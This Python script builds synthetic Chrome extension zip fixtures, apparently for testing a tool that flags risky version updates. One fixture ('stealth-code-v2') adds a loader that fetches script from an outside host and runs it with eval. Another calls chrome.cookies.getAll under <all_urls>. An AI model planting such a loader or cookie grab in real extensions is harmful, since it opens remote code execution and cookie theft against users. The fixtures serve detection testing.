import os
import zipfile
import json

FIXTURES_DIR = 'test-fixtures'
os.makedirs(FIXTURES_DIR, exist_ok=True)

def create_zip(filename, file_dict):
    path = os.path.join(FIXTURES_DIR, filename)
    with zipfile.ZipFile(path, 'w', zipfile.ZIP_DEFLATED) as z:
        for fname, content in file_dict.items():
            z.writestr(fname, content)
    print(f"Created fixture: {path}")

# 1. Benign pair (v1 vs v2)
create_zip('benign-v1.zip', {
    'manifest.json': json.dumps({
        "manifest_version": 3,
        "name": "Quick Notes Utility",
        "version": "1.0.0",
        "description": "Simple local note taking utility",
        "permissions": ["storage"],
        "background": { "service_worker": "background.js" }
    }, indent=2),
    'background.js': '// Quick Notes v1.0.0\nchrome.runtime.onInstalled.addListener(() => console.log("Installed v1"));'
})

create_zip('benign-v2.zip', {
    'manifest.json': json.dumps({
        "manifest_version": 3,
        "name": "Quick Notes Utility",
        "version": "1.0.1",
        "description": "Simple local note taking utility - bugfixes",
        "permissions": ["storage"],
        "background": { "service_worker": "background.js" }
    }, indent=2),
    'background.js': '// Quick Notes v1.0.1\nchrome.runtime.onInstalled.addListener(() => console.log("Installed v1.0.1 - fixed note rendering"));'
})

# 2. Suspicious Permission Expansion pair
create_zip('suspicious-expansion-v1.zip', {
    'manifest.json': json.dumps({
        "manifest_version": 3,
        "name": "Weather Widget Pro",
        "version": "2.1.0",
        "description": "Shows local weather forecasts",
        "permissions": ["alarms"],
        "host_permissions": ["https://api.weather.com/*"],
        "background": { "service_worker": "background.js" }
    }, indent=2),
    'background.js': '// Weather v2.1.0\nasync function fetchWeather() { return fetch("https://api.weather.com/v1/forecast"); }'
})

create_zip('suspicious-expansion-v2.zip', {
    'manifest.json': json.dumps({
        "manifest_version": 3,
        "name": "Weather Widget Pro",
        "version": "2.2.0",
        "description": "Shows local weather forecasts with analytics",
        "permissions": ["alarms", "cookies", "webRequest"],
        "host_permissions": ["<all_urls>"],
        "background": { "service_worker": "background.js" }
    }, indent=2),
    'background.js': '// Weather v2.2.0 with expanded interception\nchrome.cookies.getAll({}, (cookies) => console.log("Cookies found"));'
})

# 3. Stealth Code Modification (permissions unchanged, but adds dynamic eval & beacon)
create_zip('stealth-code-v1.zip', {
    'manifest.json': json.dumps({
        "manifest_version": 3,
        "name": "PDF Reader Tools",
        "version": "1.4.0",
        "description": "Enhance PDF viewing",
        "permissions": ["storage", "tabs"],
        "background": { "service_worker": "worker.js" }
    }, indent=2),
    'worker.js': '// PDF Reader v1.4.0\nchrome.tabs.onUpdated.addListener((tabId, info) => { console.log("Tab updated"); });'
})

create_zip('stealth-code-v2.zip', {
    'manifest.json': json.dumps({
        "manifest_version": 3,
        "name": "PDF Reader Tools",
        "version": "1.4.1",
        "description": "Enhance PDF viewing",
        "permissions": ["storage", "tabs"],
        "background": { "service_worker": "worker.js" }
    }, indent=2),
    'worker.js': '''// PDF Reader v1.4.1
chrome.tabs.onUpdated.addListener((tabId, info) => {
  console.log("Tab updated");
});

// Added remote payload loader & dynamic execution
async function runRemoteScript(url) {
  const res = await fetch("https://telemetry-analytics-collector-gateway.com/v1/script");
  const payload = await res.text();
  eval(payload); // dynamic code execution lead!
}
'''
})

# 4. False Positive / Harmless metadata check
create_zip('false-positive-check-v1.zip', {
    'manifest.json': json.dumps({
        "manifest_version": 3,
        "name": "Tab Colorizer",
        "version": "3.0.0",
        "description": "Colorize tabs for productivity",
        "permissions": ["tabs", "storage"]
    }, indent=2),
    'index.js': 'console.log("Tab colorizer active");'
})

create_zip('false-positive-check-v2.zip', {
    'manifest.json': json.dumps({
        "manifest_version": 3,
        "name": "Tab Colorizer - Organization Tool",
        "version": "3.0.1",
        "description": "Colorize tabs for productivity - now updated with Japanese and French translations",
        "permissions": ["tabs", "storage"]
    }, indent=2),
    'index.js': 'console.log("Tab colorizer active v3.0.1");'
})

# 5. Manifest V3 declaring webRequestBlocking
create_zip('mv3-webrequestblocking.zip', {
    'manifest.json': json.dumps({
        "manifest_version": 3,
        "name": "AdBlock Legacy Port",
        "version": "1.0.0",
        "description": "Attempts to use webRequestBlocking in MV3",
        "permissions": ["webRequest", "webRequestBlocking", "storage"],
        "host_permissions": ["<all_urls>"]
    }, indent=2),
    'background.js': '// Incompatible with Chrome MV3 Web Store rules\nconsole.log("MV3 webRequestBlocking test");'
})

print("All synthetic test fixtures built successfully!")
